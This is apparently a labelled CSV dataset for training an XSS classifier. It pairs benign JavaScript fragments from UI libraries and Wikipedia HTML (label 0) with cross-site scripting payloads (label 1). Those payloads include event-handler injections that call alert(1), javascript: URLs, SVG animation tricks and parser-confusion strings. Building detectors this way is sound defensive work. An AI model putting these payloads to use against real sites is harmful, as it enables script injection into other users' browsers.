payload,label
_this71.dropdown.focusedindex = selectedoption.index(); _this71.dropdown._focusfocuseditem(); m.keydown = false;,0
"<style>:target {color: red;}</style><audio id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></audio>",1
m.carousel = carousel,0
} _elemisactive(elem) { return elem.classlist.contains(class_name_active),0
"<a style=""behavior:url(#default#anchorclick);"" folder=""javascript:alert(1)"">xss</a>",1
if (this._element === nextelement || this._element.contains(nextelement)) { return; },0
"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>",1
"clickcallback: '(function|null)', isanimated: 'boolean', isvisible: 'boolean',",0
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationend=""alert(1)""></caption>",1
open($trigger) { if (this.isopen) { return;,0
"complete: () => { $(this._overlay).css('display', 'none'); }",0
"<li><a href=""/wiki/wikidata"" title=""wikidata"">wikidata </a><span class=""nowrap"">&#160;",0
"https://portswigger-labs.net/xss/xss.php?x=%3csvg%20onload=innerhtml=url,innerhtml=textcontent%3e",1
"<noframes><img title=""</noframes><img src onerror=alert(1)>""></noframes>",1
_this59.options.oncloseend.call(_this59); } _this59.isopen = false;,0
position: function () {,0
"<ul><li><a href=""/wiki/averroes"" title=""averroes"">averroes </a> </li>",0
value: function selectoption(el) {,0
"<fieldset onbeforecopy=""alert(1)"" contenteditable>test</fieldset>",1
"} }, trigger(element, event, args) {",0
if (!values.length) { var firstdisabled = this.$el.find('option:disabled').eq(0); if (firstdisabled.length && firstdisabled[0].value === '') {,0
const class_name_static = 'modal-static',0
"}); $(document).on('reset', function (e) { var formreset = $(e.target);",0
<details onpointerup=alert(1)>xss</details>,1
"<frameset draggable=""true"" ondragend=""alert(1)"">test</frameset>",1
this._clearactiveclass(targetelement(entry)),0
"super(tabs, el, options)",0
"}); $(document).on('change', '.file-field input[type=""file""]', function() { let file_field = $(this).closest('.file-field');",0
"return addnodeto(base, options.cssclasses.connect)",0
"return { ...defaultbspopperconfig, ...execute(this._config.popperconfig, [undefined, defaultbspopperconfig])",0
<script>onscrollend=settimeout;document.body.style.height='9999px';document.documentelement.scrolltop=1;event.prototype.tostring=syntaxerror.prototype.tostring;event.prototype.name='alert\x281\x29'</script>,1
"<li><a href=""/wiki/ai_control_problem"" title=""ai control problem"">control problem </a> </li>",0
var option = $(e.target).closest('li')[0],0
"<title onmouseover=""alert(1)"">test</title>",1
_gettemplatefactory(content) {,0
"<style>:target {color:red;}</style><strong id=x style=""transition:color 1s"" ontransitionend=alert(1)></strong>",1
class button extends basecomponent {,0
"key: ""_handlemodalcloseclick"", value: function _handlemodalcloseclick(e) { var $closetrigger = $(e.target).closest('.modal-close');",0
"<shadow oncopy=""alert(1)"" contenteditable>test</shadow>",1
return; } this._animatein();,0
"<div draggable=""true"" contenteditable>drag me</div><area ondragover=alert(1) contenteditable>drop here</area>",1
"<link ondblclick=""alert(1)"">test</link>",1
<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>,1
"</span><a href=""/w/index.php?title=artificial_intelligence&amp;action=edit&amp;section=36"" title=""edit section: healthcare"">edit </a><span class=""mw-editsection-bracket"">]",0
"<style>@keyframes slidein {}</style><rp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rp>",1
"<style>:target {color: red;}</style><ul id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></ul>",1
"$(document).on('change', '.file-field input[type=""file""]', function () {",0
"<bdi draggable=""true"" ondragend=""alert(1)"">test</bdi>",1
"<var onbeforepaste=""alert(1)"" contenteditable>test</var>",1
"return; } element.removeeventlistener(typeevent, fn, boolean(delegationselector));",0
<summary id=x tabindex=1 onfocusin=alert(1)></summary>,1
import tooltip from './tooltip.js' import { definejqueryplugin } from './util/index.js' const name = 'popover',0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><p id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></p>",1
m.keydown = false; if (e.which === m.keys.tab || e.which === m.keys.arrow_down || e.which === m.keys.arrow_up) { m.tabpressed = false;,0
"<keygen onkeypress=""alert(1)"" contenteditable>test</keygen>",1
const data = button.getorcreateinstance(button) data.toggle() }),0
this._isappended = true } _emulateanimation(callback) {,0
scrollspy._ticks = 0; m.scrollspy = scrollspy; if (m.jqueryloaded) {,0
this.hours = +value[0] || 0; this.minutes = +value[1] || 0; this.spanhours.innerhtml = this.hours;,0
"<li class=""toclevel-2 tocsection-43""><a href=""#military""><span class=""tocnumber"">7.8",0
"<time onmouseleave=""alert(1)"">test</time>",1
"if (plugin.prototype[methodoroptions]) { let params = array.prototype.slice.call(arguments, 1); if (methodoroptions.slice(0, 3) === 'get') {",0
"<basefont oncopy=""alert(1)"" contenteditable>test</basefont>",1
<aside onpointerup=alert(1)>xss</aside>,1
function iselementscaled(element) {,0
"<canvas oncontextmenu=""alert(1)"">test</canvas>",1
"<button onbeforecut=""alert(1)"" contenteditable>test</button>",1
"<hgroup onkeydown=""alert(1)"" contenteditable>test</hgroup>",1
this._resetautocomplete(); } },0
} _cleartimeout() { cleartimeout(this._timeout);,0
"<param draggable=""true"" ondragend=""alert(1)"">test</param>",1
"<style>:target {transform: rotate(180deg);}</style><nextid id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nextid>",1
} if (this.dragged) { e.preventdefault();,0
if ( eventname === eventtype ) {,0
"<figure oncut=""alert(1)"" contenteditable>test</figure>",1
<plaintext onpointerover=alert(1)>xss</plaintext>,1
if (elementmap.has(element)) { return elementmap.get(element).get(key) || null },0
const event_click_data_api$3 = `click${event_key$6}${data_api_key$3}`,0
"<param onmousemove=""alert(1)"">test</param>",1
"<template onmousemove=""alert(1)"">test</template>",1
return defaulttype$4,0
animoptions.maxheight = this.newheight; } anim(animoptions);,0
} if (!this.nowrap || this.center - i >= 0) { el = this.images[this._wrap(this.center - i)];,0
"</p><p><a href=""/wiki/multi-agent_planning"" title=""multi-agent planning"">multi-agent planning </a> uses the <a href=""/wiki/cooperation"" title=""cooperation"">cooperation </a> and competition of many agents to achieve a given goal. <a href=""/wiki/emergent_behavior"" class=""mw-redirect"" title=""emergent behavior"">emergent behavior </a> such as this is used by <a href=""/wiki/evolutionary_algorithms"" class=""mw-redirect"" title=""evolutionary algorithms"">evolutionary algorithms </a> and <a href=""/wiki/swarm_intelligence"" title=""swarm intelligence"">swarm intelligence </a>.<sup id=""cite_ref-multi-agent_planning_114-0"" class=""reference""><a href=""#cite_note-multi-agent_planning-114"">&#91;111&#93; </a> </sup>",0
}) definejqueryplugin(collapse) export default collapse,0
"<rtc onbeforecopy=""alert(1)"" contenteditable>test</rtc>",1
this.$anchor.css({ transition: 'none' });,0
"} this.el.removeeventlistener('mousedown', this._handlecarouseltapbound); this.el.removeeventlistener('mousemove', this._handlecarouseldragbound);",0
"}; var scrollspy = function (_component9) { _inherits(scrollspy, _component9);",0
"<li><img alt=""wikiproject"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/3/37/people_icon.svg/16px-people_icon.svg.png"" decoding=""async"" title=""wikiproject"" width=""16"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/3/37/people_icon.svg/24px-people_icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/3/37/people_icon.svg/32px-people_icon.svg.png 2x"" data-file-width=""100"" data-file-height=""100"" /><b><a href=""/wiki/wikipedia:wikiproject_computer_science"" title=""wikipedia:wikiproject computer science"">wikiproject </a> </b> </li>",0
"definition of ai as the study of <a href=""/wiki/intelligent_agents"" class=""mw-redirect"" title=""intelligent agents"">intelligent agents </a>:",0
"<template oncopy=""alert(1)"" contenteditable>test</template>",1
ripplestyle.opacity = '1'; ripplestyle['-webkit-transition-duration'] = effect.duration + 'ms'; ripplestyle['-moz-transition-duration'] = effect.duration + 'ms';,0
let day = date.getday(); return day === 0 || day === 6; },0
"_classcallcheck(this, dropdown)",0
"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationstart=""alert(1)""></select>",1
"return this[state ? ""addclass"" : ""removeclass""](c)",0
const elements = [].concat(...createddocument.body.queryselectorall('*')); for (const element of elements) { const elementname = element.nodename.tolowercase();,0
"<em onmouseout=""alert(1)"">test</em>",1
var selectindex = currchips.chipsdata.length,0
"<style>:target {color: red;}</style><* id=x style=""transition:color 10s"" ontransitioncancel=print()></*>",1
<abbr onpointermove=alert(1)>xss</abbr>,1
"y: y }, getwindow(popper)) : { x: x,",0
"<article draggable=""true"" ondrag=""alert(1)"">test</article>",1
"<p>ai is relevant to any intellectual task.<sup id=""cite_ref-footnoterussellnorvig20091_289-0"" class=""reference""><a href=""#cite_note-footnoterussellnorvig20091-289"">&#91;278&#93; </a> </sup> modern artificial intelligence techniques are pervasive<sup id=""cite_ref-:1_290-0"" class=""reference""><a href=""#cite_note-:1-290"">&#91;279&#93; </a> </sup> and are too numerous to list here. frequently, when a technique reaches mainstream use, it is no longer considered artificial intelligence; this phenomenon is described as the <a href=""/wiki/ai_effect"" title=""ai effect"">ai effect </a>.<sup id=""cite_ref-footnote&#39;&#39;cnn&#39;&#39;2006_291-0"" class=""reference""><a href=""#cite_note-footnote&#39;&#39;cnn&#39;&#39;2006-291"">&#91;280&#93; </a> </sup>",0
]; } static _isleapyear(year) {,0
"if (c in a.style) return getcomputedstyle(a).getpropertyvalue(c.replace(/([a-z])([a-z])/g, ""$1-$2"").tolowercase()) || ""0""",0
<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>,1
"this.$el.css({ transform: '', transition:",0
<meter onpointerup=alert(1)>xss</meter>,1
if (this.isopen === true) {,0
$('.dropdown-trigger').dropdown(),0
"for (arr = []; i < j && i <= opts.maxyear; i++) { if (i >= opts.minyear) { arr.push(""<option value=\"""" + i + ""\"" "" + (i === year ? 'selected=""selected""' : '') + "">"" + i + ""</option>"");",0
var chipel = this._renderchip(this.chipsdata[i]),0
"<ruby draggable=""true"" ondragstart=""alert(1)"">test</ruby>",1
if (this._config.reference === 'parent') { referenceelement = this._parent; } else if (index_js.iselement(this._config.reference)) {,0
"<small onmouseout=""alert(1)"">test</small>",1
if ( mode === 'positions' ) { return values.map(function( value ){ return scope_spectrum.fromstepping( stepped ? scope_spectrum.getstep( value ) : value );,0
"<dl onbeforecut=""alert(1)"" contenteditable>test</dl>",1
"https://portswigger-labs.net/xss/xss.php?x=%3cimg/src/onerror=innerhtml=url,innerhtml=textcontent%3e",1
var clippingparents = 'clippingparents',0
var radian = i / 6 * math.pi,0
<ruby id=x tabindex=1 onfocus=alert(1)></ruby>,1
this._observer = this._getnewobserver() } for (const section of this._observablesections.values()) {,0
"<li><a href=""/wiki/bayesian_network"" title=""bayesian network"">bayesian networks </a> </li>",0
<script onpointerenter=alert(1)>xss</script>,1
} if ($('#scale-demo').length && $('#scale-demo-trigger').length) { $('#scale-demo-trigger').click(function() {,0
"'use strict'; let _defaults = { classes: '',",0
"</span> <span class=""reference-text"">r. j. williams and d. zipser. gradient-based learning algorithms for recurrent networks and their computational complexity. in back-propagation: theory, architectures and applications. hillsdale, nj: erlbaum, 1994.",0
if (this.options.swipeable) { this._teardownswipeabletabs(); } else {,0
"resetclock(delay) { let view = this.currentview, value = this[view],",0
"<marquee draggable=""true"" ondragleave=""alert(1)"">test</marquee>",1
"<style onclick=""alert(1)"">test</style>",1
"this.$headers.attr('tabindex', 0); this._setupeventhandlers(); let $activebodies = this.$el.children('li.active').children('.collapsible-body');",0
"<output onmouseup=""alert(1)"">test</output>",1
<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>,1
_animateinfab() { this.$el.addclass('active'); let time = 0;,0
"eventhandler.on(this._element, event_keydown_dismiss$1, event => { if (event.key !== escape_key$1) { return;",0
"<img lowsrc=""javascript:alert('')"">",1
"<video onmouseleave=""alert(1)"">test</video>",1
this.verticaldragged = false; this.reference = this._xpos(e); this.referencey = this._ypos(e);,0
"this.el.style.transition = 'transform .05s, opacity .05s'; this.el.style.transform = `translatex(${activationdistance}px)`; this.el.style.opacity = 0;",0
"<li><a href=""/wiki/catastrophe_theory"" title=""catastrophe theory"">catastrophe theory </a> </li>",0
"import config from './config.js' import { execute, executeaftertransition, getelement, reflow",0
"if ($(e.target).is(input_selector)) { $(e.target) .siblings('label, .prefix')",0
"var ishours = view === 'hours', nextview = ishours ? this.hoursview : this.minutesview, hideview = ishours ? this.minutesview : this.hoursview;",0
"this.el.addeventlistener('mouseenter', this._handlemouseenterbound); this.el.addeventlistener('mouseleave', this._handlemouseleavebound); this.el.addeventlistener('focus', this._handlefocusbound, true);",0
".find('input[type=""checkbox""]')",0
"<p>artificial intelligence (ai) is becoming a mainstay component of law-related professions. in some circumstances, this analytics-crunching technology is using algorithms and machine learning to do work that was previously done by entry-level lawyers.<sup class=""noprint inline-template template-fact"" style=""white-space:nowrap;"">&#91;<i><a href=""/wiki/wikipedia:citation_needed"" title=""wikipedia:citation needed""><span title=""this claim needs references to reliable sources. (december 2019)"">citation needed",0
"<style>:target {transform: rotate(180deg);}</style><noscript id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noscript>",1
var _this52 = this; var windowwidth = window.innerwidth; var windowheight = window.innerheight;,0
"<em onclick=""alert(1)"">test</em>",1
selected = this._toggleentryfromarray(key),0
yyyy: () => { return this.date.getfullyear(); },0
} } _handlewindowescape(e) {,0
<svg><figcaption onload=alert(1)></figcaption>,1
return; } index = this._wrap(index);,0
<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,1
if ( options.ort === 0 ) {,0
"c=""javascript:""",1
"<div id=""philosophers_of_science_by_era"" style=""font-size:114%;margin:0 4em""><a href=""/wiki/list_of_philosophers_of_science"" title=""list of philosophers of science"">philosophers of science </a> by era </div> </th> </tr><tr><td colspan=""2"" class=""navbox-list navbox-odd"" style=""width:100%;padding:0px"">",0
<menu id=x tabindex=1 onactivate=alert(1)></menu>,1
var pos = offset(el); var relativey = (e.pagey - pos.top); var relativex = (e.pagex - pos.left);,0
"<div draggable=""true"" contenteditable>drag me</div><bdi ondrop=alert(1) contenteditable>drop here</bdi>",1
"<nav draggable=""true"" ondragenter=""alert(1)"">test</nav>",1
"<details draggable=""true"" ondragstart=""alert(1)"">test</details>",1
"key: ""_xpos"", value: function _xpos(e) { if (e.targettouches && e.targettouches.length >= 1) {",0
<style id=x tabindex=1 onfocusin=alert(1)></style>,1
"<tfoot onmouseout=""alert(1)"">test</tfoot>",1
"<figure onpaste=""alert(1)"" contenteditable>test</figure>",1
start = this.percentopen,0
if (i >= opts.minyear) {,0
this._renderdatedisplay(); return this.draw(); },0
"var origin = addnodeto(base, options.cssclasses.origin)",0
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",1
"<acronym onmouseleave=""alert(1)"">test</acronym>",1
"<svg><animate xlink:href=""#x"" attributename=""href"" values=""data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x"" /><use id=x />",1
"this.prop(key, name[key]); } return this;",0
"</span> <span class=""reference-text""><cite class=""citation book"">mead, carver a.; ismail, mohammed (8 may 1989). <a rel=""nofollow"" class=""external text"" href=""http://fennetic.net/irc/christopher%20r.%20carroll%20carver%20mead%20mohammed%20ismail%20analog%20vlsi%20implementation%20of%20neural%20systems.pdf""><i>analog vlsi implementation of neural systems </i> </a> <span class=""cs1-format"">(pdf)",0
"function insertcontent(parent, child, prepend) {",0
"this._updateitemstyle(el, tweenedopacity, -i, transformstring); } if (this.options.fullwidth) {",0
<video><source onerror=alert(1) src=1></video>,1
"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",1
"const tab_nav_backward = 'backward'; const default$7 = { autofocus: true,",0
"static jqueryinterface(config) { return this.each(function () { const data = dropdown.getorcreateinstance(this, config)",0
<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>,1
$(this).toggleclass('container'),0
promise.resolve().then(function () {,0
"<u onkeydown=""alert(1)"" contenteditable>test</u>",1
toggle(relatedtarget) {,0
<small id=x tabindex=1 onfocusin=alert(1)></small>,1
<menu onpointerdown=alert(1)>xss</menu>,1
return this[0] ? this[0].getattribute ? this[0].getattribute(name) : this[0][name] : undefined,0
url(javascript:alert('')),1
}]; } this.adjustcalendars();,0
"<dir oncontextmenu=""alert(1)"">test</dir>",1
}); }function d(a) { return g.reversed ? g.duration - a : a;,0
</h3>,0
"<meta onmouseout=""alert(1)"">test</meta>",1
"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>",1
const event_activate = `activate${event_key}`; const event_click = `click${event_key}`; const event_load_data_api = `load${event_key}${data_api_key}`;,0
"<code onkeydown=""alert(1)"" contenteditable>test</code>",1
let $closetrigger = $(e.target).closest('.modal-close'); if ($closetrigger.length) { this.close();,0
<textarea autofocus onfocus=alert(1)>test</textarea>,1
class range extends component {,0
<title onpointerover=alert(1)>xss</title>,1
"<li><a href=""/wiki/hardware_acceleration"" title=""hardware acceleration"">hardware acceleration </a> </li> </ul>",0
if (context._menu.contains(event.target) && (event.type === 'keyup' && event.key === tab_key || /input|select|option|textarea|form/i.test(event.target.tagname))) {,0
<summary onpointerenter=alert(1)>xss</summary>,1
hide: function(e) { touchhandler.touchup(e); var el = this;,0
"<tt draggable=""true"" ondragstart=""alert(1)"">test</tt>",1
"var classes = getclasses(c); return (classes ? this.each(function (v) { var spacedname = "" "" + v.classname + "" "";",0
"this._element.setattribute('aria-pressed', this._element.classlist.toggle(class_name_active$3))",0
}; const slideevent = triggerevent(event_slide); if (slideevent.defaultprevented) {,0
<noscript id=x tabindex=1 onfocusin=alert(1)></noscript>,1
"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",1
x -= offsetx - popperrect.width; x *= gpuacceleration ? 1 : -1; },0
} dismiss() { window.clearinterval(this.counterinterval);,0
if (getcomputedstyle(element).position !== 'fixed') {,0
this.isopen = false; } });,0
effect.wrapinput([element]),0
if (opts.isempty) { if (opts.showdaysinnextandpreviousmonths) { arr.push('is-outside-current-month');,0
"var camelregex = /(?:^\w|[a-z]|\b\w)/g, whitespace = /[\s-_]+/g; return function (str) { return str.replace(camelregex, function (letter, index) {",0
"<ul><li><a href=""#citerefrussellnorvig2003"">russell &amp; norvig 2003 </a>, pp.&#160;430–449 </li> </ul>",0
"radius = ishours && value > 0 && value < 13 ? this.options.innerradius : this.options.outerradius, x = math.sin(radian) * radius, y = -math.cos(radian) * radius,",0
"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",1
"<li><a href=""/wiki/probability"" title=""probability"">probability </a> </li>",0
} static get defaulttype() { return defaulttype$a;,0
<textarea onpaste=alert(1) autofocus></textarea>,1
<slot onpointerenter=alert(1)>xss</slot>,1
_updatetooltipcontent() {,0
"document.body.removeeventlistener('click', this._handledocumentclickbound, true); document.body.removeeventlistener('touchend', this._handledocumentclickbound); }",0
"<li><a href=""/wiki/qualia"" title=""qualia"">qualia </a> </li>",0
"<head draggable=""true"" ondragleave=""alert(1)"">test</head>",1
<time onpointerdown=alert(1)>xss</time>,1
"window.index.pipeline.reset(); window.index.add({ href: 'http://materializecss.com/about.html',",0
<pre onpointerup=alert(1)>xss</pre>,1
"<meta oncopy=""alert(1)"" contenteditable>test</meta>",1
var naturalheight = firstimage[0].naturalheight,0
"<figure onmouseout=""alert(1)"">test</figure>",1
<keygen onpointerenter=alert(1)>xss</keygen>,1
<isindex onpointerout=alert(1)>xss</isindex>,1
"src=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode",1
"<dl><dt><a href=""/wiki/agent_architecture"" title=""agent architecture"">agent architectures </a> and <a href=""/wiki/cognitive_architecture"" title=""cognitive architecture"">cognitive architectures </a> </dt>",0
); $(this.wrapper).prepend(dropdownicon[0]); if (!this.el.disabled) {,0
"<rp draggable=""true"" ondragstart=""alert(1)"">test</rp>",1
"<li><a href=""/wiki/radio-frequency_identification"" title=""radio-frequency identification"">rfid </a>",0
<span onpointermove=alert(1)>xss</span>,1
<p onblur=alert(1) tabindex=1 id=x></p><input autofocus>,1
"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationstart=""alert(1)""></isindex>",1
"<small onmouseenter=""alert(1)"">test</small>",1
"<li class=""toclevel-2 tocsection-37""><a href=""#automotive""><span class=""tocnumber"">7.2",0
"var rect = this[0].getboundingclientrect(); return { top: rect.top + win.pageyoffset - docel.clienttop,",0
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></element>",1
"<style>:target {color:red;}</style><video id=x style=""transition:color 1s"" ontransitionend=alert(1)></video>",1
let nativedispatch = true; let defaultprevented = false; if (innamespace && $) {,0
"const outerelem = this._getouterelement(child) child.setattribute('aria-selected', isactive) if (outerelem !== child) {",0
"} = this._config; if (typeof offset === 'string') { return offset.split(',').map(value => number.parseint(value, 10));",0
"}); }function r(a, c, d, b) { var f = ""delay"" === a;return c.length ? (f ? math.min : math.max).apply(math, c.map(function (b) {",0
<optgroup onpointerdown=alert(1)>xss</optgroup>,1
"<a onmouseout=""alert(1)"">test</a>",1
throw new typeerror(,0
_inserthtmlintodom() { this.$modalel = $(timepicker._template); this.modalel = this.$modalel[0];,0
class carousel extends basecomponent {,0
classes = getclasses(c),0
<tt onpointerover=alert(1)>xss</tt>,1
toast.time = date.now(),0
"const selector = getselector(element); return selector ? selectorengine.findone(selector) : null; },",0
<span onpointerover=alert(1)>xss</span>,1
"<li><a href=""/wiki/talcott_parsons"" title=""talcott parsons"">talcott parsons </a> </li>",0
"<input oncontextmenu=""alert(1)"">test</input>",1
var domelem = !!el.jquery ? el[0] : el; return domelem.m_scrollspy; },0
"}function v(b,f,c,d,e,p,q,k,l,h,n,a){q=a",0
<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>,1
value: function open() { if (this.isopen === true) { return;,0
var $trigger = $(e.target); for (var i = scrollspy._elements.length - 1; i >= 0; i--) { var scrollspy = scrollspy._elements[i];,0
trigger: 'string' }; class tooltip extends basecomponent {,0
"<menu onkeypress=""alert(1)"" contenteditable>test</menu>",1
return getselectmultiple_(el),0
"<embed onmouseleave=""alert(1)"">test</embed>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></menu>",1
this.$dropdownel.css({,0
"<li><a href=""/wiki/beam_robotics"" title=""beam robotics"">beam robotics </a> </li>",0
_resetcurrentelement() {,0
"if (this.options.hover) { this.el.removeeventlistener('mouseenter', this._handlemouseenterbound); this.el.removeeventlistener('mouseleave', this._handlemouseleavebound);",0
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onanimationend=""alert(1)""></datalist>",1
$this.siblings('label').addclass('active'),0
} static _handlescroll() { for (let i = 0; i < parallax._parallaxes.length; i++) {,0
"<style>:target {color:red;}</style><p id=x style=""transition:color 1s"" ontransitionend=alert(1)></p>",1
$(this).trigger('change'),0
"const isanimated = this._element.classlist.contains(class_name_fade$5); this._queuecallback(() => this._destroyelement(), this._element, isanimated); }",0
var styleproperties = object.keys(state.styles.hasownproperty(name) ? state.styles[name] : initialstyles[name]),0
"<div draggable=""true"" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>",1
<tt id=x tabindex=1 onactivate=alert(1)></tt>,1
"""oncut=alert``",1
if (this._observer) { this._observer.disconnect(); } else {,0
"$el.html(""<span>"" + beforematch + ""<span class='highlight'>"" + matchtext + ""</span>"" + aftermatch + ""</span>""); if (img.length) { $el.prepend(img);",0
"<b onmouseleave=""alert(1)"">test</b>",1
return object.values(this._activetrigger).includes(true) } _getconfig(config) {,0
<base id=x tabindex=1 onbeforeactivate=alert(1)></base>,1
</nav>,0
"<div draggable=""true"" contenteditable>drag me</div><h1 ondragover=alert(1) contenteditable>drop here</h1>",1
"this._element.setattribute('data-bs-original-title', title)",0
"import { execute, getelement, iselement } from './index.js'",0
"<nav onmouseenter=""alert(1)"">test</nav>",1
"<ins oncontextmenu=""alert(1)"">test</ins>",1
"<plaintext onclick=""alert(1)"">test</plaintext>",1
const arrow_down_key$1 = 'arrowdown',0
if (this._element.style.display === 'none') { throw new error('please use show on visible elements'); },0
"<style>:target {transform: rotate(180deg);}</style><param id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></param>",1
<iframe src=http://.rocks/scriptlet.html <,1
static _ondragend() { if (!!toast._draggedtoast) { let toast = toast._draggedtoast;,0
} const iscycling = boolean(this._interval) this.pause(),0
value: function _settimer() { var _this29 = this; if (this.timeremaining !== infinity) {,0
"} _disableoverflow() { this._saveinitialattribute(this._element, 'overflow')",0
if (!!toast._draggedtoast) { e.preventdefault(); let toast = toast._draggedtoast;,0
return; } state.elements.arrow = arrowelement;,0
<a id=x tabindex=1 onfocusin=alert(1)></a>,1
import sidebarscroll from './partials/sidebar.js' import snippets from './partials/snippets.js' sidebarscroll(),0
"<video onmouseout=""alert(1)"">test</video>",1
alignment = 'translatex(0)'; centertweenedopacity = 1; } else {,0
"<li id=""cite_note-moma-343""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-moma_343-0"">^ </a> </b>",0
newcalendar = visibledate < firstvisibledate.gettime() || lastvisibledate.gettime() < visibledate,0
<sub onpointerenter=alert(1)>xss</sub>,1
"markersizeclasses = [ options.cssclasses.markernormal, options.cssclasses.markerlarge,",0
"<div draggable=""true"" contenteditable>drag me</div><element ondrop=alert(1) contenteditable>drop here</element>",1
"const tip = this._gettipelement() this._element.setattribute('aria-describedby', tip.getattribute('id')) const { container } = this._config",0
if (object.hasclass('validate')) { object.removeclass('valid'); object.removeclass('invalid');,0
if (typeof this.options.completecallback === 'function') { this.options.completecallback(); },0
"} function within(min$1, value, max$1) { return max(min$1, min(value, max$1));",0
<header onpointerup=alert(1)>xss</header>,1
"eventhandler.on(document, clickevent, `[data-bs-dismiss=""${name}""]`, function (event) { if (['a', 'area'].includes(this.tagname)) { event.preventdefault();",0
"top: [this.options.startingtop, this.options.endingtop], opacity: 1, scalex: [0.8, 1],",0
<element onpointerover=alert(1)>xss</element>,1
if (closeddetails !== element) {,0
<dialog onfocusout=alert(1) tabindex=1 id=x></dialog><input autofocus>,1
<bdo onpointerdown=alert(1)>xss</bdo>,1
const data_api_key$4 = '.data-api'; const event_show$6 = `show${event_key$7}`; const event_shown$6 = `shown${event_key$7}`;,0
this._focusfocuseditem(); } } else if (e.which === m.keys.enter && this.isopen) {,0
function order(modifiers) { var map = new map(); var visited = new set();,0
var itemel = $(e.target).closest('li')[0],0
"<image onkeyup=""alert(1)"" contenteditable>test</image>",1
"<select onkeyup=""alert(1)"" contenteditable>test</select>",1
"<col onmousedown=""alert(1)"">test</col>",1
return object.freeze(n); } const popper__namespace = _interopnamespacedefault(popper);,0
return function handler(event) {,0
"case ""select-one"": return getselectsingle_(el); case ""select-multiple"":",0
"<li id=""cite_note-footnotedomingos2015chapter_6-212""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnotedomingos2015chapter_6_212-0"">^ </a> </b>",0
"<u onmouseenter=""alert(1)"">test</u>",1
<form><textarea oninvalid=alert(1) required><input type=submit>,1
function a() { b = requestanimationframe(c); }function c(c) {,0
</span></a></dt><dd>learn how to use contracts for testing your spiders.</dd>,0
"var params = array.prototype.slice.call(arguments, 1)",0
} }); const alreadyopen = selectorengine.findone(open_selector);,0
"<div draggable=""true"" contenteditable>drag me</div><header ondragover=alert(1) contenteditable>drop here</header>",1
if (this.timeremaining <= 0) {,0
this.$chips.remove(); this.el.m_chips = undefined; },0
